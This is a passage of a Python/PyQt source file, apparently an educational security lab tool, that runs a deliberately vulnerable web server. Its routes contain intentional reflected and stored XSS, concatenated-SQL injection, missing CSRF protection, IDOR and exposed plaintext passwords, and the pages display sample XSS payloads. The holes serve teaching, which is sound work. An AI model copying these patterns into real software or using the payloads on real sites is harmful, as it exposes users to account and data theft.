            linhas, _, _ = banco_servidor.consultar_seguro(
                "SELECT id, name, price FROM products WHERE name LIKE ?",
                (f"%{termo_bruto}%",)
            )
            if linhas:
                linhas_html = "".join(
                    f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>R$ {r[2]:.2f}</td></tr>"
                    for r in linhas
                )
                tabela = (
                    f"<table><thead><tr><th>ID</th><th>Nome</th><th>Preco</th></tr></thead>"
                    f"<tbody>{linhas_html}</tbody></table>"
                )
            else:
                tabela = "<p style='color:#7f8c8d;'>Nenhum produto encontrado.</p>"

            # XSS REAL: termo_bruto inserido diretamente no HTML sem escape algum
            bloco_resultado = f"<p>Resultados para: <strong>{termo_bruto}</strong></p><br>{tabela}"

        conteudo = f"""
        <div class="card">
            <h1>Busca de Produtos</h1>
            <div class="aviso">
                XSS Refletido ativo: o parametro <code>?q=</code> e refletido
                no HTML sem escape — scripts no parametro sao executados.
            </div>
            <div class="info">
                Exemplos: <code>/busca?q=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <code>/busca?q=&lt;img src=x onerror=alert(document.cookie)&gt;</code>
            </div>
            <form method="GET" action="/busca">
                <label>Termo de busca</label>
                <input type="text" name="q" placeholder="Nome do produto">
                <button type="submit">Buscar</button>
            </form>
            <br>
            {bloco_resultado}
        </div>
        """
        return self._pagina_base("Busca", conteudo)

    def _rota_comentarios(self) -> str:
        """
        Exibe e permite postar comentarios.

        VULNERABILIDADE REAL — XSS Armazenado:
          Comentarios sao armazenados no banco sem sanitizacao e
          exibidos no HTML sem escape. Scripts afetam todos os visitantes.

        VULNERABILIDADE REAL — CSRF:
          Formulario sem token CSRF — qualquer site pode submeter comentarios
          em nome de um usuario autenticado.
        """
        linhas, _, _ = banco_servidor.consultar_seguro(
            "SELECT id, author, content, created_at FROM comments ORDER BY id DESC"
        )

        # XSS REAL: content exibido sem escape — scripts armazenados sao executados
        comentarios_html = ""
        for linha in linhas:
            _, autor, conteudo_comentario, criado_em = linha
            comentarios_html += f"""
            <div class="comentario-item">
                <div class="comentario-autor">{autor or "anonimo"} — {criado_em or ""}</div>
                <!-- XSS ARMAZENADO: conteudo sem escape HTML -->
                <div>{conteudo_comentario}</div>
            </div>
            """

        if not comentarios_html:
            comentarios_html = "<p style='color:#7f8c8d;'>Nenhum comentario ainda.</p>"

        conteudo = f"""
        <div class="card">
            <h1>Comentarios</h1>
            <div class="aviso">
                Vulnerabilidades ativas:<br>
                - XSS Armazenado: comentarios exibidos sem escape HTML<br>
                - CSRF: formulario sem token de protecao<br>
                - SQL Injection: INSERT por concatenacao direta (autor e conteudo)
            </div>
            <div class="info">
                Teste XSS Armazenado — poste este payload no campo Comentario:<br>
                <code>&lt;script&gt;alert('XSS armazenado!')&lt;/script&gt;</code><br>
                Depois recarregue a pagina — o script executa para todos os visitantes.
            </div>
            <!-- SEM TOKEN CSRF — VULNERABILIDADE INTENCIONAL -->
            <form method="POST" action="/comentarios">
                <label>Nome (opcional)</label>
                <input type="text" name="autor" placeholder="Anonimo">
                <label>Comentario</label>
                <textarea name="conteudo" placeholder="Digite aqui..."></textarea>
                <button type="submit">Publicar</button>
            </form>
        </div>
        <div class="card">
            <h2>Comentarios publicados</h2>
            {comentarios_html}
        </div>
        """
        return self._pagina_base("Comentarios", conteudo)

    def _processar_comentario(self, params: dict, ip_cliente: str) -> str:
        """
        Armazena um comentario no banco sem nenhuma sanitizacao.

        VULNERABILIDADE REAL — XSS Armazenado:
          O conteudo e inserido via SQL com concatenacao (SQL Injection tambem presente)
          e armazenado no banco. Ao ser exibido, scripts sao executados no browser.
        """
        autor    = params.get("autor",    ["anonimo"])[0][:100]
        conteudo = params.get("conteudo", [""])[0]

        if not conteudo.strip():
            return self._rota_comentarios()

        if _detectar_xss(conteudo) or _detectar_xss(autor):
            sinais_servidor.alerta_emitido.emit(
                f"[XSS ARMAZENADO] {ip_cliente} — payload em comentario: "
                f"'{conteudo[:80]}'"
            )

        if _detectar_sqli(conteudo) or _detectar_sqli(autor):
            sinais_servidor.alerta_emitido.emit(
                f"[SQL INJECTION] {ip_cliente} — payload em INSERT de comentario: "
                f"'{conteudo[:80]}'"
            )

        agora = datetime.now().strftime("%H:%M:%S")

        # VULNERABILIDADE REAL: INSERT com concatenacao direta (SQL Injection + XSS armazenado)
        query_vulneravel = (
            f"INSERT INTO comments (author, content, created_at) "
            f"VALUES ('{autor}', '{conteudo}', '{agora}')"
        )
        sucesso, erro = banco_servidor.modificar_vulneravel(query_vulneravel)

        if not sucesso:
            conteudo_html = f"""
            <div class="card">
                <h1>Erro ao publicar comentario</h1>
                <div class="aviso">Erro SQL divulgado (information disclosure): {erro}</div>
                <pre>Query executada:\n{query_vulneravel}</pre>
                <a href="/comentarios">Tentar novamente</a>
            </div>
            """
            return self._pagina_base("Erro", conteudo_html)

        return self._rota_comentarios()

    def _rota_pedidos(self, params: dict) -> str:
        """
        Exibe detalhes de um pedido por ID.

        VULNERABILIDADE REAL — IDOR (Insecure Direct Object Reference):
          Qualquer pedido pode ser acessado sem verificar se o usuario logado
          e o dono. Nao ha autenticacao nem controle de acesso.
        """
        try:
            pedido_id = int(params.get("id", ["1"])[0].strip())
        except (ValueError, IndexError):
            pedido_id = 1

        # IDOR REAL: nenhuma verificacao de autorizacao
        # Qualquer ID entre 1 e N retorna dados de outro usuario
        linhas, _, _ = banco_servidor.consultar_seguro(
            """SELECT o.id, u.username, u.role,
                      p.name, p.price, o.quantity,
                      (p.price * o.quantity) AS total
               FROM orders o
               JOIN users    u ON o.user_id    = u.id
               JOIN products p ON o.product_id = p.id
               WHERE o.id = ?""",
            (pedido_id,)
        )

        # Lista todos os IDs disponiveis para navegacao facil
        todos_ids, _, _ = banco_servidor.consultar_seguro(
            "SELECT id FROM orders ORDER BY id"
        )
        navegacao = " ".join(
            f"<a href='/pedidos?id={r[0]}'>[{r[0]}]</a>"
            for r in todos_ids
        )

        if not linhas:
            conteudo = f"""
            <div class="card">
                <h1>Pedido #{pedido_id} nao encontrado</h1>
                <div class="aviso">IDOR ativo — percorra os IDs: {navegacao}</div>
                <a href="/pedidos?id=1">Ir para o pedido #1</a>
            </div>
            """
            return self._pagina_base("Pedido", conteudo)

        r = linhas[0]
        pid, dono_usuario, dono_papel, produto, preco, qtd, total = r

        sinais_servidor.alerta_emitido.emit(
            f"[IDOR] Pedido #{pid} acessado sem autorizacao. "
            f"Dono: {dono_usuario} ({dono_papel})"
        )

        conteudo = f"""
        <div class="card">
            <h1>Pedido #{pid}</h1>
            <div class="aviso">
                IDOR: este pedido foi acessado sem nenhuma verificacao de autorizacao.<br>
                Qualquer pessoa pode ver pedidos de qualquer outro usuario apenas alterando o ID.
            </div>
            <table>
                <tbody>
                    <tr>
                        <td><strong>ID do pedido</strong></td>
                        <td>{pid}</td>
                    </tr>
                    <tr>
                        <td><strong>Dono do pedido</strong></td>
                        <td><span style="color:#E74C3C;">{dono_usuario}</span>
                            (papel: {dono_papel})</td>
                    </tr>
                    <tr>
                        <td><strong>Produto</strong></td>
                        <td>{produto}</td>
                    </tr>
                    <tr>
                        <td><strong>Preco unitario</strong></td>
                        <td>R$ {preco:.2f}</td>
                    </tr>
                    <tr>
                        <td><strong>Quantidade</strong></td>
                        <td>{qtd}</td>
                    </tr>
                    <tr>
                        <td><strong>Total</strong></td>
                        <td><strong>R$ {total:.2f}</strong></td>
                    </tr>
                </tbody>
            </table>
            <br>
            <p>Navegar por outros pedidos: {navegacao}</p>
        </div>
        """
        return self._pagina_base("Pedido", conteudo)

    def _rota_usuarios(self) -> str:
        """
        Lista todos os usuarios com senhas em texto puro.

        VULNERABILIDADE REAL — Divulgacao de Dados Sensiveis:
          Nenhuma autenticacao necessaria. Qualquer pessoa pode acessar.
          Senhas armazenadas em texto puro (sem hash).
        """
        linhas, _, _ = banco_servidor.consultar_seguro(
            "SELECT id, username, password, role FROM users ORDER BY id"
        )

        linhas_html = "".join(
            f"<tr>"
            f"<td>{r[0]}</td>"
            f"<td>{r[1]}</td>"
            f"<td style='color:#E74C3C; font-family:Consolas;'>{r[2]}</td>"
            f"<td>{r[3]}</td>"
            f"</tr>"
            for r in linhas
        )

        sinais_servidor.alerta_emitido.emit(
            f"[DIVULGACAO] /usuarios acessado — {len(linhas)} usuarios e "
            f"senhas em texto puro expostos sem autenticacao"
        )

        conteudo = f"""
        <div class="card">
            <h1>Lista de Usuarios</h1>
            <div class="aviso">
                Vulnerabilidades:<br>
                - Sem autenticacao para acessar esta pagina<br>
                - Senhas armazenadas em texto puro (sem hash)<br>
                - Dados exibidos sem controle de acesso
            </div>
            <div class="info">
                Use estas credenciais para testar o login e o SQL Injection.<br>
                Tambem disponiveis em JSON: <a href="/api/usuarios">/api/usuarios</a>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Usuario</th>
                        <th>Senha (texto puro)</th>
                        <th>Papel</th>
                    </tr>
                </thead>
                <tbody>{linhas_html}</tbody>
            </table>
        </div>
        """
        return self._pagina_base("Usuarios", conteudo)

    def _rota_perfil(self, params: dict) -> str:
        """
        Exibe perfil de usuario com o nome refletido.

        VULNERABILIDADE REAL — XSS Refletido:
          O parametro ?nome= e inserido diretamente no HTML sem escape.
          Scripts no parametro sao executados imediatamente no browser.
        """
        # Valor recebido sem nenhum tratamento
        nome_bruto = params.get("nome", [""])[0]

        if _detectar_xss(nome_bruto):
            sinais_servidor.alerta_emitido.emit(
                f"[XSS REFLETIDO] /perfil?nome=: '{nome_bruto[:80]}'"
            )

        # XSS REAL: nome_bruto inserido diretamente no HTML sem escape
        bloco_nome = (
            f"<h2>Perfil de: {nome_bruto}</h2>"
            if nome_bruto else
            "<h2>Perfil</h2>"
        )

        conteudo = f"""
        <div class="card">
            <h1>Pagina de Perfil</h1>
            <div class="aviso">
                XSS Refletido: o parametro <code>?nome=</code> e inserido
                diretamente no HTML sem escape algum.
            </div>
            <div class="info">
                Teste: <code>/perfil?nome=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
                Teste: <code>/perfil?nome=&lt;img src=x onerror=alert(1)&gt;</code>
            </div>
            <!-- XSS REAL: nome_bruto inserido sem escape abaixo -->
            {bloco_nome}
            <br>
            <form method="GET" action="/perfil">
                <label>Nome do usuario</label>
                <input type="text" name="nome" placeholder="Digite um nome">
                <button type="submit">Ver perfil</button>
            </form>
        </div>
        """
        return self._pagina_base("Perfil", conteudo)

    # -----------------------------------------------------------------------
    # Helpers HTTP — envio de respostas
    # -----------------------------------------------------------------------

    def _enviar_html(self, status: int, corpo: str, cookie: str = ""):
        """Envia uma resposta com conteudo HTML."""
        corpo_bytes = corpo.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(corpo_bytes)))
        if cookie:
            self.send_header("Set-Cookie", cookie)
        self.end_headers()
        self.wfile.write(corpo_bytes)

    def _enviar_json(self, status: int, dados: dict):
        """Envia uma resposta com conteudo JSON."""
        corpo_bytes = json.dumps(dados, ensure_ascii=False, indent=2).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(corpo_bytes)))
        self.end_headers()
        self.wfile.write(corpo_bytes)

    def _redirecionar(self, destino: str):
        """Envia um redirect HTTP 302."""
        self.send_response(302)
        self.send_header("Location", destino)
        self.end_headers()

    def _registrar(self, ip: str, metodo: str, caminho: str,
                   tamanho: int, ts_inicio: float, corpo: str = ""):
        """Registra a requisicao e notifica a interface Qt via sinal."""
        tempo_ms = int((time.time() - ts_inicio) * 1000)
        dados = {
            "timestamp":    datetime.now().strftime("%H:%M:%S"),
            "ip_cliente":   ip,
            "metodo":       metodo,
            "endpoint":     caminho,
            "tamanho":      tamanho,
            "user_agent":   self.headers.get("User-Agent", "")[:40],
            "tempo_ms":     tempo_ms,
            "reqs_por_seg": 0,
            "bloqueado":    False,
            "corpo":        corpo,
        }
        sinais_servidor.requisicao_recebida.emit(dados)

        # Detecta ataques no corpo do POST para alertas adicionais
        if corpo:
            if _detectar_sqli(corpo):
                sinais_servidor.alerta_emitido.emit(
                    f"[SQL INJECTION] POST {caminho} de {ip}: '{corpo[:60]}'"
                )
            elif _detectar_xss(corpo):
                sinais_servidor.alerta_emitido.emit(
                    f"[XSS] POST {caminho} de {ip}: '{corpo[:60]}'"
                )

    def log_message(self, formato, *args):
        """Suprime a saida de log padrao do HTTPServer no terminal."""
        pass


# ===========================================================================
# Servidor HTTP multi-thread
# ===========================================================================

class ServidorHTTPMultithread(ThreadingMixIn, HTTPServer):
    """Servidor HTTP com suporte a multiplas conexoes simultaneas."""
    daemon_threads = True

    def handle_error(self, request, client_address):
        """Silencia erros de conexao abruptamente encerrada (comuns em testes de carga)."""
        import sys
        tipo_exc, _, _ = sys.exc_info()
        if tipo_exc and issubclass(tipo_exc, (BrokenPipeError,
                                               ConnectionResetError,
                                               ConnectionAbortedError)):
            return
        super().handle_error(request, client_address)


class ThreadServidor(threading.Thread):
    """Thread dedicada ao servidor HTTP — nao bloqueia a interface Qt."""

    def __init__(self, porta: int):
        super().__init__(daemon=True)
        self.porta   = porta
        self._server: Optional[HTTPServer] = None

    def run(self):
        """Inicia o servidor e aguarda requisicoes."""
        try:
            self._server = ServidorHTTPMultithread(
                ("0.0.0.0", self.porta), HandlerVulneravel
            )
            sinais_servidor.status_alterado.emit(
                f"Servidor vulneravel iniciado na porta {self.porta}"
            )
            self._server.serve_forever()
        except Exception as erro:
            sinais_servidor.status_alterado.emit(f"Erro ao iniciar servidor: {erro}")

    def parar(self):
        """Para o servidor de forma nao-bloqueante."""
        if self._server:
            threading.Thread(
                target=self._server.shutdown, daemon=True
            ).start()


# ===========================================================================
# Widget Qt — Painel do Servidor de Laboratorio
# ===========================================================================

class PainelServidor(QWidget):
    """
    Aba 'Servidor de Laboratorio' do NetLab Educacional.

    Permite iniciar e parar um servidor HTTP vulneravel para demonstracoes
    de seguranca em sala de aula. Exibe requisicoes e alertas em tempo real.
    """

    # Sinal emitido quando um cliente acessa o servidor (compatibilidade com janela_principal)
    cliente_detectado = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._thread_servidor: Optional[ThreadServidor] = None
        self._servidor_ativo       = False
        self._total_requisicoes    = 0
        self._total_bytes          = 0
        self._contador_por_segundo = 0
        self._clientes_unicos: set = set()
        self._porta_atual          = 8080

        self._timer_metricas = QTimer()
        self._timer_metricas.timeout.connect(self._atualizar_metricas_por_segundo)

        sinais_servidor.requisicao_recebida.connect(self._ao_receber_requisicao)
        sinais_servidor.status_alterado.connect(self._ao_mudar_status)
        sinais_servidor.alerta_emitido.connect(self._ao_emitir_alerta)

        self._montar_layout()

    # -----------------------------------------------------------------------
    # Construcao da interface
    # -----------------------------------------------------------------------

    def _montar_layout(self):
        """Monta o layout principal do painel com splitter horizontal."""
        layout = QVBoxLayout(self)
        layout.setContentsMargins(4, 2, 4, 4)
        layout.setSpacing(4)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        layout.addWidget(splitter)

        splitter.addWidget(self._criar_painel_controles())
        splitter.addWidget(self._criar_painel_requisicoes())
        splitter.setSizes([350, 730])

    def _criar_painel_controles(self) -> QWidget:
        """Painel esquerdo: configuracao, status e metricas."""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 8, 0)
        layout.setSpacing(8)

        layout.addWidget(self._criar_grupo_configuracao())
        layout.addWidget(self._criar_grupo_status())
        layout.addWidget(self._criar_grupo_metricas())
        layout.addStretch()

        return widget

    def _criar_grupo_configuracao(self) -> QGroupBox:
        """Grupo de configuracao: porta e botao iniciar/parar."""
        grp = QGroupBox("Configuracao")
        grp.setStyleSheet(
            "QGroupBox { border: 1px solid #1e3a5f; border-radius: 6px; "
            "margin-top: 8px; font-weight: bold; color: #bdc3c7; }"
            "QGroupBox::title { subcontrol-origin: margin; padding: 0 6px; }"
        )
        layout = QGridLayout(grp)

        lbl_porta = QLabel("Porta:")
        lbl_porta.setStyleSheet("color: #ecf0f1; font-size: 11px;")
        layout.addWidget(lbl_porta, 0, 0)

        # Controle de porta com botoes +/-
        cont_porta = QWidget()
        hbox_porta = QHBoxLayout(cont_porta)
        hbox_porta.setContentsMargins(0, 0, 0, 0)
        hbox_porta.setSpacing(2)

        btn_menos = self._criar_botao_controle("-", "#3498DB", 18, 18)
        btn_menos.clicked.connect(lambda: self._ajustar_porta(-1))
        hbox_porta.addWidget(btn_menos)

        self.lbl_porta = QLabel(str(self._porta_atual))
        self.lbl_porta.setFixedSize(52, 25)
        self.lbl_porta.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.lbl_porta.setStyleSheet(
            "background: #0d1a2a; color: #ecf0f1; border: 1px solid #3498DB;"
            "border-radius: 4px; font-size: 12px; font-weight: bold;"
        )
        hbox_porta.addWidget(self.lbl_porta)

        btn_mais = self._criar_botao_controle("+", "#3498DB", 18, 18)
        btn_mais.clicked.connect(lambda: self._ajustar_porta(+1))
        hbox_porta.addWidget(btn_mais)

        layout.addWidget(cont_porta, 0, 1)

        self.btn_iniciar = QPushButton("Iniciar Servidor")
        self.btn_iniciar.setObjectName("botao_captura")
        self.btn_iniciar.setMinimumHeight(30)
        self.btn_iniciar.clicked.connect(self._alternar_servidor)
        layout.addWidget(self.btn_iniciar, 1, 0, 1, 2)

        return grp

    def _criar_grupo_status(self) -> QGroupBox:
        """Grupo de status: estado do servidor e endereco de acesso."""
        grp = QGroupBox("Status do Servidor")
        grp.setStyleSheet(
            "QGroupBox { border: 1px solid #1e3a5f; border-radius: 6px; "
            "margin-top: 2px; font-weight: bold; color: #bdc3c7; }"
            "QGroupBox::title { subcontrol-origin: margin; padding: 0 3px; }"
        )
        layout = QVBoxLayout(grp)

        self.lbl_status = QLabel("Servidor parado")
        self.lbl_status.setStyleSheet(
            "color: #E74C3C; font-weight: bold; font-size: 11px;"
        )
        layout.addWidget(self.lbl_status)

        self.lbl_endereco = QTextEdit()
        self.lbl_endereco.setReadOnly(True)
        self.lbl_endereco.setMaximumHeight(55)
        self.lbl_endereco.setStyleSheet(
            "color: #3498DB; font-family: Consolas; font-size: 11px;"
            "background: #0d1a2a; border: 1px solid #1e3a5f; border-radius: 4px; padding: 6px;"
        )
        self.lbl_endereco.setText("---")
        layout.addWidget(self.lbl_endereco)

        lbl_instr = QLabel(
            "Acesse o endereco acima de qualquer\n"
            "dispositivo na mesma rede Wi-Fi."
        )
        lbl_instr.setStyleSheet("color: #7f8c8d; font-size: 10px;")
        lbl_instr.setWordWrap(True)
        layout.addWidget(lbl_instr)

        return grp

    def _criar_grupo_metricas(self) -> QGroupBox:
        """Grupo de metricas: contadores em tempo real."""
        grp = QGroupBox("Metricas em Tempo Real")
        grp.setStyleSheet(
            "QGroupBox { border: 1px solid #1e3a5f; border-radius: 6px; "
            "margin-top: 8px; font-weight: bold; color: #bdc3c7; }"
            "QGroupBox::title { subcontrol-origin: margin; padding: 0 6px; }"
        )
        layout = QGridLayout(grp)

        def _card_metrica(rotulo: str, valor: str, cor: str) -> tuple:
            """Cria um card de metrica com rotulo e valor destacado."""
            lbl_rotulo = QLabel(rotulo)
            lbl_rotulo.setStyleSheet(
                f"color: {cor}; font-size: 9px; font-weight: bold;"
            )
            lbl_rotulo.setAlignment(Qt.AlignmentFlag.AlignCenter)
            lbl_valor = QLabel(valor)
            lbl_valor.setStyleSheet(
                "color: #ecf0f1; font-size: 15px; font-weight: bold;"
            )
            lbl_valor.setAlignment(Qt.AlignmentFlag.AlignCenter)
            return lbl_rotulo, lbl_valor

        lr1, self.lbl_total_reqs  = _card_metrica("TOTAL REQS", "0",   "#3498DB")
        lr2, self.lbl_reqs_seg    = _card_metrica("REQS/SEG",   "0",   "#E74C3C")
        lr3, self.lbl_total_bytes = _card_metrica("DADOS",      "0 B", "#2ECC71")
        lr4, self.lbl_clientes    = _card_metrica("CLIENTES",   "0",   "#9B59B6")

        for coluna, (lr, lv) in enumerate([
            (lr1, self.lbl_total_reqs),
            (lr2, self.lbl_reqs_seg),
            (lr3, self.lbl_total_bytes),
            (lr4, self.lbl_clientes),
        ]):
            frame = QFrame()
            frame.setStyleSheet(
                "QFrame { background: #0d1a2a; border: 1px solid #1e3a5f; "
                "border-radius: 6px; }"
            )
            fl = QVBoxLayout(frame)
            fl.setContentsMargins(4, 4, 4, 4)
            fl.addWidget(lr)
            fl.addWidget(lv)
            layout.addWidget(frame, 0, coluna)

        self.barra_carga = QProgressBar()
        self.barra_carga.setRange(0, 50)
        self.barra_carga.setValue(0)
        self.barra_carga.setTextVisible(False)
        self.barra_carga.setStyleSheet(
            "QProgressBar { background: #0d1a2a; border: 1px solid #1e3a5f;"
            "border-radius: 4px; height: 10px; }"
            "QProgressBar::chunk { background: #3498DB; border-radius: 3px; }"
        )
        lbl_carga = QLabel("Carga:")
        lbl_carga.setStyleSheet("color: #7f8c8d; font-size: 10px;")
        layout.addWidget(lbl_carga,       1, 0, 1, 2)
        layout.addWidget(self.barra_carga, 1, 2, 1, 2)

        return grp

    @staticmethod
    def _criar_botao_controle(texto: str, cor: str, larg: int, alt: int) -> QPushButton:
        """Cria um botao compacto de controle numerico."""
        btn = QPushButton(texto)
        btn.setFixedSize(larg, alt)
        btn.setStyleSheet(
            f"QPushButton {{ background: #2c3e50; color: white; "
            f"border: 1px solid {cor}; border-radius: 4px; "
            f"font-size: 14px; font-weight: bold; padding: 0; }}"
            f"QPushButton:hover {{ background: #34495e; }}"
            f"QPushButton:pressed {{ background: #1e2b3a; }}"
        )
        return btn

    def _criar_painel_requisicoes(self) -> QWidget:
        """Painel direito: tabela de requisicoes e log de alertas."""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(8, 0, 0, 0)
        layout.setSpacing(6)

        splitter_v = QSplitter(Qt.Orientation.Vertical)
        layout.addWidget(splitter_v)

        # Tabela de requisicoes recebidas
        w_tabela = QWidget()
        l_tabela = QVBoxLayout(w_tabela)
        l_tabela.setContentsMargins(0, 0, 0, 0)

        lbl_tabela = QLabel("Requisicoes Recebidas em Tempo Real")
        fonte_tabela = QFont("Arial", 10)
        fonte_tabela.setBold(True)
        lbl_tabela.setFont(fonte_tabela)
        lbl_tabela.setStyleSheet("color: #bdc3c7;")
        l_tabela.addWidget(lbl_tabela)

        self.tabela_reqs = QTableWidget(0, 7)
        self.tabela_reqs.setHorizontalHeaderLabels([
            "Hora", "IP Cliente", "Metodo", "Endpoint",
            "Tamanho", "Tempo(ms)", "Payload"
        ])
        self.tabela_reqs.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.ResizeToContents
        )
        self.tabela_reqs.horizontalHeader().setStretchLastSection(True)
        self.tabela_reqs.verticalHeader().setVisible(False)
        self.tabela_reqs.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.tabela_reqs.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.tabela_reqs.setAlternatingRowColors(True)
        l_tabela.addWidget(self.tabela_reqs)
        splitter_v.addWidget(w_tabela)

        # Log de alertas de seguranca
        w_alertas = QWidget()
        l_alertas = QVBoxLayout(w_alertas)
        l_alertas.setContentsMargins(0, 0, 0, 0)

        lbl_alertas = QLabel("Alertas de Vulnerabilidades Detectadas")
        lbl_alertas.setStyleSheet(
            "color: #E67E22; font-weight: bold; font-size: 10px;"
        )
        l_alertas.addWidget(lbl_alertas)

        self.texto_alertas = QTextEdit()
        self.texto_alertas.setReadOnly(True)
        self.texto_alertas.setMaximumHeight(160)
        self.texto_alertas.setStyleSheet(
            "QTextEdit { background: #0a0f1a; color: #ecf0f1; "
            "border: 1px solid #1e3a5f; border-radius: 4px; "
            "padding: 6px; font-family: Consolas; font-size: 10px; }"
        )
        self.texto_alertas.setPlaceholderText(
            "Alertas de SQL Injection, XSS, IDOR, CSRF e outros aparecerao aqui..."
        )
        l_alertas.addWidget(self.texto_alertas)
        splitter_v.addWidget(w_alertas)

        splitter_v.setSizes([500, 160])
        return widget

    # -----------------------------------------------------------------------
    # Controle do ciclo de vida do servidor
    # -----------------------------------------------------------------------

    def _alternar_servidor(self):
        """Alterna entre iniciar e parar o servidor."""
        if self._servidor_ativo:
            self._parar_servidor()
        else:
            self._iniciar_servidor()

    def _ajustar_porta(self, delta: int):
        """Ajusta o numero da porta dentro dos limites permitidos."""
        nova_porta = self._porta_atual + delta
        if 1024 <= nova_porta <= 65535:
            self._porta_atual = nova_porta
            self.lbl_porta.setText(str(nova_porta))

    def _iniciar_servidor(self):
        """Inicia o servidor HTTP e o banco de dados em memoria."""
        # Reinicializa o banco — limpa todos os dados da sessao anterior
        banco_servidor.inicializar()

        # Limpa sessoes ativas da sessao anterior
        global _sessoes_ativas
        _sessoes_ativas.clear()

        # Reseta contadores da interface
        self._total_requisicoes    = 0
        self._total_bytes          = 0
        self._clientes_unicos      = set()
        self._contador_por_segundo = 0

        self._thread_servidor = ThreadServidor(self._porta_atual)
        self._thread_servidor.start()
        self._servidor_ativo = True

        self.btn_iniciar.setText("Parar Servidor")
        self.btn_iniciar.setObjectName("botao_parar")
        self._repolir(self.btn_iniciar)

        ip_local = self._obter_ip_local()
        self.lbl_status.setText("Servidor ativo")
        self.lbl_status.setStyleSheet(
            "color: #2ECC71; font-weight: bold; font-size: 11px;"
        )
        self.lbl_endereco.setText(
            f"http://{ip_local}:{self._porta_atual}/\n"
            f"http://{ip_local}:{self._porta_atual}/login"
        )

        self._timer_metricas.start(1000)
        self._adicionar_alerta(
            "INFO",
            f"Servidor vulneravel iniciado em "
            f"http://{ip_local}:{self._porta_atual}/ — banco SQLite em memoria criado"
        )

    def _parar_servidor(self):
        """Para o servidor HTTP e descarta o banco de dados em memoria."""
        self._timer_metricas.stop()

        if self._thread_servidor:
            self._thread_servidor.parar()

        # Encerra a conexao — todos os dados sao descartados
        banco_servidor.encerrar()

        self._servidor_ativo = False
        self.btn_iniciar.setText("Iniciar Servidor")
        self.btn_iniciar.setObjectName("botao_captura")
        self._repolir(self.btn_iniciar)

        self.lbl_status.setText("Servidor parado")
        self.lbl_status.setStyleSheet(
            "color: #E74C3C; font-weight: bold; font-size: 11px;"
        )
        self.lbl_endereco.setText("---")
        self.barra_carga.setValue(0)
        self.lbl_reqs_seg.setText("0")
        self._adicionar_alerta(
            "INFO", "Servidor parado. Banco de dados em memoria descartado."
        )

    # -----------------------------------------------------------------------
    # Slots de sinais — atualizacao da interface com dados do servidor
    # -----------------------------------------------------------------------

    def _ao_receber_requisicao(self, dados: dict):
        """Adiciona uma linha na tabela para cada requisicao recebida."""
        self._total_requisicoes    += 1
        self._total_bytes          += dados.get("tamanho", 0)
        self._contador_por_segundo += 1

        ip = dados.get("ip_cliente", "")
        self._clientes_unicos.add(ip)

        if ip:
            self.cliente_detectado.emit(ip)

        # Insere no topo da tabela (requisicao mais recente primeiro)
        self.tabela_reqs.insertRow(0)

        payload_resumido = dados.get("corpo", "")[:35].replace("\n", " ")
        itens = [
            dados.get("timestamp", ""),
            ip,
            dados.get("metodo", ""),
            dados.get("endpoint", ""),
            f"{dados.get('tamanho', 0)} B",
            f"{dados.get('tempo_ms', 0)} ms",
            payload_resumido,
        ]

        for coluna, texto in enumerate(itens):
            item = QTableWidgetItem(str(texto))
            self.tabela_reqs.setItem(0, coluna, item)

        # Limita o numero de linhas para nao sobrecarregar a interface
        while self.tabela_reqs.rowCount() > 120:
            self.tabela_reqs.removeRow(120)

        # Atualiza os contadores nos cards
        self.lbl_total_reqs.setText(f"{self._total_requisicoes:,}")
        kb = self._total_bytes / 1024
        self.lbl_total_bytes.setText(
            f"{kb / 1024:.1f} MB" if kb > 1024 else f"{kb:.1f} KB"
        )
        self.lbl_clientes.setText(str(len(self._clientes_unicos)))

        # Alerta adicional para requisicoes POST com corpo
        corpo = dados.get("corpo", "")
        if corpo and dados.get("metodo") == "POST":
            self._adicionar_alerta("INFO", f"POST de {ip}: {corpo[:80]}")

    def _ao_mudar_status(self, mensagem: str):
        """Atualiza o label de status com a mensagem recebida do servidor."""
        self.lbl_status.setText(mensagem)

    def _ao_emitir_alerta(self, mensagem: str):
        """Adiciona um alerta de seguranca ao log."""
        palavras_criticas = (
            "SQL INJECTION", "XSS", "IDOR", "CSRF", "DIVULGACAO", "BRUTE"
        )
        tipo = "CRITICO" if any(p in mensagem for p in palavras_criticas) else "INFO"
        self._adicionar_alerta(tipo, mensagem)

    def _adicionar_alerta(self, tipo: str, mensagem: str):
        """Insere um alerta formatado no log de alertas."""
        cores = {
            "INFO":    "#3498DB",
            "AVISO":   "#E67E22",
            "CRITICO": "#E74C3C",
        }
        hora = datetime.now().strftime("%H:%M:%S")
        cor  = cores.get(tipo, "#ecf0f1")
        html = (
            f"<span style='color:{cor}; font-size:10px;'>"
            f"[{hora}] [{tipo}] {mensagem}"
            f"</span><br>"
        )
        self.texto_alertas.insertHtml(html)

        # Remove linhas antigas para nao crescer indefinidamente (buffer em memoria)
        if self.texto_alertas.document().lineCount() > 80:
            cursor = self.texto_alertas.textCursor()
            cursor.movePosition(cursor.MoveOperation.Start)
            cursor.movePosition(
                cursor.MoveOperation.Down,
                cursor.MoveMode.KeepAnchor,
                12
            )
            cursor.removeSelectedText()

    def _atualizar_metricas_por_segundo(self):
        """Atualiza os contadores de requisicoes por segundo e barra de carga."""
        self.lbl_reqs_seg.setText(str(self._contador_por_segundo))
        self.barra_carga.setValue(min(self._contador_por_segundo, 50))
        self._contador_por_segundo = 0

    # -----------------------------------------------------------------------
    # Utilitarios
    # -----------------------------------------------------------------------

    @staticmethod
